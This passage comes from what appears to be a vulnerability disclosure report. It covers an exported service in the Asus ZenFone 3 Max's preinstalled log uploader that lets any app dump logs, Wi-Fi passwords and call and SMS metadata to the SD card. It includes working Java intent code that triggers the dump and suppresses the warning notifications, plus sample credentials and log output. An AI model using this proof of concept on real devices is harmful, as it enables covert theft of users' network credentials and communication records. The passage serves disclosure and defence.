需要访问移动设备，没有提供相关步骤
日志路径固定
敏感信息有明显特征，可以通过关键词定位；敏感信息是明文，不需要解码

攻击方式：需要访问系统，还需要一定的Android开发知识才可以利用漏洞

5.3	Asus ZenFone 3 Max – Obtaining the Logcat Logs, WiFi Passwords and More

The  Asus  ZenFone  3  Max  Android  device  contains  a  pre-installed  app  with  a  package  name  of com.asus.loguploader (versionCode=1570000275,	versionName=7.0.0.55_170515)	with	an exported interface that allows any app on the phone to obtain a dumpstate file (kernel log, logcat log, dump of system services, which includes text of active notifications), Wi-Fi Passwords, and other system data that	gets	written	to	external	storage.	The	build	fingerprint	of	the	device	is asus/US_Phone/ASUS_X008_1:7.0/NRD90M/US_Phone-14.14.1711.92-20171208:user/release- keys. In addition, the phone numbers for outgoing and incoming telephone calls get written to the logcat log, as well as the telephone numbers for outgoing and incoming text messages. Therefore, having access to the logcat log (via the dumpstate file), allows one to also obtain some telephony meta-data.

The com.asus.loguploader app has an exported component named com.asus.loguploader.LogUploaderService. This component can be accessed by an app on the device to generate the log files that get dumped to external storage. Once an app interacts with it using a specific intent, the device will vibrate once and create two notifications: one that says “Log generating… Please wait for a while” and another that says “Bug Reporter is running. Tap for more information or to stop the app.” The device will vibrate again when the generation of the log files has completed. These two notifications are temporary and will be removed in around one second since a second intent is sent.

The com.asus.loguploader app cannot be disabled through the Settings app. The source code to write the log data to the SD card is provided below. The first intent is to start the log generation and the second intent is to quickly remove the notifications. If the second intent was not sent, the generation of log files would leave notifications in the status bar for the user to see.

Intent i = new  Intent("MANUAL_UPLOAD");
i.setClassName("com.asus.loguploader",     "com.asus.loguploader.LogUploaderService"); startService(i);
Intent i2 = new  Intent("MOVELOG_COMPLETED");
i2.setClassName("com.asus.loguploader",     "com.asus.loguploader.LogUploaderService"); startService(i2);

The source code above will cause the  com.asus.loguploader app to write log data to a base directory of
/sdcard/ASUS/LogUploader. Each time this code is executed, it will overwrite the previous files. A listing of the files in the most relevant directory (i.e., /sdcard/ASUS/LogUploader/general/sdcard) is provided below.

ASUS_X008_1:/sdcard/ASUS/LogUploader/general/sdcard $ ls -alh total 9.4M
drwxrwx--x 5 root sdcard_rw 4.0K 2018-05-20 13:32 .
 

drwxrwx--x 3 root sdcard_rw 4.0K 2018-05-20 13:32 ..
drwxrwx--x 2 root sdcard_rw 4.0K 2018-05-20 13:32 anr
-rwxrwx--x 1 root sdcard_rw	817 2018-05-20 13:32 df.txt
-rw-rw---- 1 root sdcard_rw 9.3M 2018-05-20 13:32 dumpstate.txt
-rwxrwx--x 1 root sdcard_rw 1.2K 2018-05-20 13:32 ls_data_anr.txt
-rwxrwx--x 1 root sdcard_rw	218 2018-05-20 13:32 ls_data_tombstones.txt
-rwxrwx--x 1 root sdcard_rw	902 2018-05-20 13:32 ls_wifi_asus_log.txt
drwxrwx--x 2 root sdcard_rw 4.0K 2018-05-20 13:32 mtklog
-rwxrwx--x 1 root sdcard_rw	474 2018-05-20 13:32 p2p_supplicant.conf
drwxrwx--x 2 root sdcard_rw 4.0K 2018-05-20 13:32 tombstones
-rwxrwx--x 1 root sdcard_rw	791 2018-05-20 13:32 wpa_supplicant.conf

The two most interesting files are dumpstate.txt and wpa_supplicant.conf. The wpa_supplicant.conf file is a copy of the /data/misc/wifi/wpa_supplicant.conf file. The wpa_supplicant.conf contains the SSID and password for each network that the device has saved. The contents of the wpa_supplicant.conf file are shown below. Some of the data below has been changed about the networks for privacy reasons.

ASUS_X008_1:/sdcard/ASUS/LogUploader/general/sdcard $ cat wpa_supplicant.conf ctrl_interface=/data/misc/wifi/sockets  driver_param=use_p2p_group_interface=1
update_config=1 device_name=US_Phone manufacturer=asus model_name=ASUS_X008DC model_number=ASUS_X008DC serial_number=H4AXGY012345DMV device_type=10-0050F204-5 os_version=01020300
config_methods=physical_display virtual_push_button p2p_no_group_iface=1
external_sim=1 wowlan_triggers=disconnect

network={
ssid="HOME-NET"
bssid=cc:35:40:b8:7c:e2 psk="5GgMK*-Aa828" key_mgmt=WPA-PSK disabled=1
id_str="%7B%22creatorUid%22%3A%221000%22%2C%22configKey%22%3A%22%5C%22HOME- NET%5C%22WPA_PSK%22%7D"
}

network={
ssid="Huba" bssid=ac:22:0b:df:15:d8 psk="2Vk69c9a*ze2" key_mgmt=WPA-PSK disabled=1
id_str="%7B%22creatorUid%22%3A%221000%22%2C%22configKey%22%3A%22%5C%Huba%5C%22W PA_PSK%22%7D"
}
 

The dumpstate.txt file is the result of running the dumpstate command28. This is essentially a dump containing the logcat log, kernel log, a dump of system services, and more. The generated dumpstate.txt file from the listing of files above is 9.3MB. Notably, the text of the active notifications is contained in the file. The active notifications from the dumpstate.txt file is provided in Appendix C. The logcat log is contained within the dumpstate.txt file. Telephony meta-data for text messages and phone calls appear in the logcat log. Below are some examples that we have identified, although there may be additional log messages that can appear.

Placing a call (log message written by the system_server process whenever the user makes a call)

05-22 12:44:02.283	1185	1185 D Telecom : CallIntentProcessor: processOutgoingCallIntent(): uriString = 7035551234: PCR.oR@AX0

Receiving a call (log message written by the com.android.phone process whenever there in an incoming call)

05-22 12:47:36.883	1823	1823 D TelecomFramework: TelephonyConnectionService: createConnection, callManagerAccount: PhoneAccountHandle{TelephonyConnectionService, 8901260145725529100f, UserHandle{0}}, callId: TC@2, request: ConnectionRequest tel:17035551234 Bundle[mParcelledData.dataSize=584], isIncoming: true, isUnknown: false

Sending a text message (log message written by the android.process.acore process whenever a text message is sent)

05-22 13:05:30.713	9110	9121 V ContactsProvider: query: uri=content://com.android.contacts/data/phones	projection=[contact_id, _id] selection=[data1 IN (?)]	args=[7035551234]	order=[null] CPID=3064 User=0 Receiving a text message

Receiving a text message (log message written by the com.android.phone process whenever a text message is received)

05-22 13:08:41.014	1823	3972 D Mms/Provider/MmsSms: query begin, uri = content://mms-sms/threadID?recipient=%2B17035551234, selection = null
05-22 13:08:41.017	1823	3972 D Mms/Provider/MmsSms: getAddressIds: get exist id=5, refinedAddress=+17035551234, currentNumber=7035551234
